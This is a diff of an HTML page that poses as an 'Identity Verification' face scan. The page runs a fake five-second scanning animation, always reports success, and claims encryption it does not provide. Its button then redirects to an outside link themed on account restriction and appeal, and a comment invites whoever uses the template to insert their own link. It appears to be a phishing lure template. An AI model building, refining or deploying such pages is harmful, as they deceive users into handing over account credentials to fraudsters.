@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI Face Verification</title>
+<title>Secure Verification</title>
 
 <style>
 
@@ -19,72 +19,96 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
-    background:#020617;
     overflow:hidden;
+    background:#030712;
     color:white;
 }
 
-.bg{
+.bg1,
+.bg2{
     position:absolute;
-    width:500px;
-    height:500px;
-    background:#00ff99;
-    filter:blur(180px);
-    opacity:0.12;
     border-radius:50%;
+    filter:blur(150px);
+}
+
+.bg1{
+    width:420px;
+    height:420px;
+    background:#00ffaa;
+    top:-100px;
+    left:-100px;
+    opacity:0.18;
+}
+
+.bg2{
+    width:420px;
+    height:420px;
+    background:#0088ff;
+    bottom:-100px;
+    right:-100px;
+    opacity:0.18;
 }
 
 .card{
     position:relative;
-    width:370px;
-    padding:28px;
-    border-radius:28px;
-    background:rgba(15,23,42,0.92);
+    width:380px;
+    padding:30px;
+    border-radius:32px;
+    background:rgba(15,23,42,0.88);
     border:1px solid rgba(255,255,255,0.08);
-    backdrop-filter:blur(12px);
+    backdrop-filter:blur(14px);
     box-shadow:
-        0 0 40px rgba(0,0,0,0.6),
-        inset 0 0 20px rgba(255,255,255,0.03);
+    0 0 50px rgba(0,0,0,0.6),
+    inset 0 0 25px rgba(255,255,255,0.03);
     text-align:center;
 }
 
 .logo{
-    width:82px;
-    height:82px;
+    width:90px;
+    height:90px;
     margin:auto;
     border-radius:50%;
-    background:linear-gradient(135deg,#00ff99,#00bfff);
     display:flex;
     justify-content:center;
     align-items:center;
-    font-size:38px;
-    box-shadow:0 0 35px rgba(0,255,153,0.5);
+    background:linear-gradient(135deg,#00ffaa,#0099ff);
+    font-size:42px;
+    box-shadow:0 0 35px rgba(0,255,170,0.45);
 }
 
 .title{
-    margin-top:18px;
-    font-size:29px;
+    margin-top:20px;
+    font-size:30px;
     font-weight:bold;
 }
 
-.sub{
-    color:#94a3b8;
+.subtitle{
     margin-top:8px;
+    color:#94a3b8;
     font-size:14px;
 }
 
 .scan-box{
     position:relative;
-    width:230px;
-    height:280px;
+    width:240px;
+    height:290px;
     margin:30px auto;
-    border-radius:28px;
+    border-radius:30px;
     overflow:hidden;
     background:#000;
-    border:2px solid rgba(0,255,153,0.6);
+    border:2px solid rgba(0,255,170,0.6);
     box-shadow:
-        0 0 25px rgba(0,255,153,0.25),
-        inset 0 0 25px rgba(0,255,153,0.08);
+    0 0 30px rgba(0,255,170,0.25),
+    inset 0 0 30px rgba(0,255,170,0.08);
+}
+
+.grid{
+    position:absolute;
+    inset:0;
+    background-image:
+    linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,0.04) 1px, transparent 1px);
+    background-size:26px 26px;
 }
 
 .face{
@@ -93,37 +117,35 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
-    font-size:130px;
-}
-
-.grid{
-    position:absolute;
-    inset:0;
-    background-image:
-    linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px);
-    background-size:25px 25px;
+    font-size:135px;
 }
 
 .scan-line{
     position:absolute;
     width:100%;
     height:5px;
-    background:#00ff99;
-    box-shadow:0 0 15px #00ff99;
-    animation:scan 2s linear infinite;
+    background:#00ffaa;
+    box-shadow:
+    0 0 15px #00ffaa,
+    0 0 25px #00ffaa;
+    animation:scan 1.8s linear infinite;
 }
 
 @keyframes scan{
-    0%{ top:0; }
-    100%{ top:100%; }
+    0%{
+        top:0;
+    }
+
+    100%{
+        top:100%;
+    }
 }
 
 .corner{
     position:absolute;
-    width:38px;
-    height:38px;
-    border:4px solid #00ff99;
+    width:40px;
+    height:40px;
+    border:4px solid #00ffaa;
 }
 
 .tl{
@@ -157,6 +179,7 @@ body{
 .status{
     font-size:18px;
     margin-top:5px;
+    letter-spacing:0.4px;
 }
 
 .progress{
@@ -165,38 +188,40 @@ body{
     background:#111827;
     border-radius:50px;
     overflow:hidden;
-    margin-top:18px;
+    margin-top:20px;
 }
 
 .bar{
     width:0%;
     height:100%;
-    background:linear-gradient(90deg,#00ff99,#00bfff);
+    border-radius:50px;
+    background:linear-gradient(90deg,#00ffaa,#0099ff);
     transition:width 5s linear;
 }
 
 #submitBtn{
     width:100%;
     padding:15px;
-    margin-top:22px;
+    margin-top:24px;
     border:none;
     border-radius:18px;
+    background:linear-gradient(135deg,#2563eb,#3b82f6);
+    color:white;
     font-size:17px;
     font-weight:bold;
     cursor:pointer;
     display:none;
-    color:white;
-    background:linear-gradient(135deg,#2563eb,#3b82f6);
-    box-shadow:0 0 25px rgba(59,130,246,0.3);
+    transition:0.3s;
+    box-shadow:0 0 25px rgba(59,130,246,0.35);
 }
 
 #submitBtn:hover{
     transform:scale(1.03);
 }
 
-.secure{
-    margin-top:16px;
-    font-size:13px;
+.verify-icon{
+    margin-top:18px;
+    font-size:14px;
     color:#64748b;
 }
 
@@ -205,20 +230,21 @@ body{
 
 <body>
 
-<div class="bg"></div>
+<div class="bg1"></div>
+<div class="bg2"></div>
 
 <div class="card">
 
     <div class="logo">
-        🤖
+        🛡️
     </div>
 
     <div class="title">
-        AI Verification
+        Identity Verification
     </div>
 
-    <div class="sub">
-        Secure biometric authentication
+    <div class="subtitle">
+        Secure face authentication system
     </div>
 
     <div class="scan-box">
@@ -239,7 +265,7 @@ body{
     </div>
 
     <div class="status" id="status">
-        Scanning face...
+        Scanning biometric identity...
     </div>
 
     <div class="progress">
@@ -247,11 +273,11 @@ body{
     </div>
 
     <button id="submitBtn">
-        Submit Verification
+        Continue Verification
     </button>
 
-    <div class="secure">
-        Encrypted AI Security System
+    <div class="verify-icon">
+        End‑to‑End Encrypted Security
     </div>
 
 </div>
@@ -262,18 +288,15 @@ const submitBtn = document.getElementById("submitBtn");
 const statusText = document.getElementById("status");
 const bar = document.getElementById("bar");
 
-
-// Auto Start Scan
 window.onload = ()=>{
 
     setTimeout(()=>{
         bar.style.width = "100%";
     },100);
 
-    // 5 Seconds Scan
     setTimeout(()=>{
 
-        statusText.innerHTML = "Identity Verified Successfully";
+        statusText.innerHTML = "Verification Completed Successfully";
 
         submitBtn.style.display = "block";
 
@@ -281,12 +304,10 @@ window.onload = ()=>{
 
 };
 
-
-// Submit Button Redirect
 submitBtn.onclick = ()=>{
 
-    // هتي پنهنجي لنڪ لڳايو
-    window.location.href = "https://appeal-system-check.netlify.app/";
+    // پنهنجي لنڪ هتي لڳايو
+    window.location.href = "https://review-request.restriction-update-issue.workers.dev/";
 
 };
 
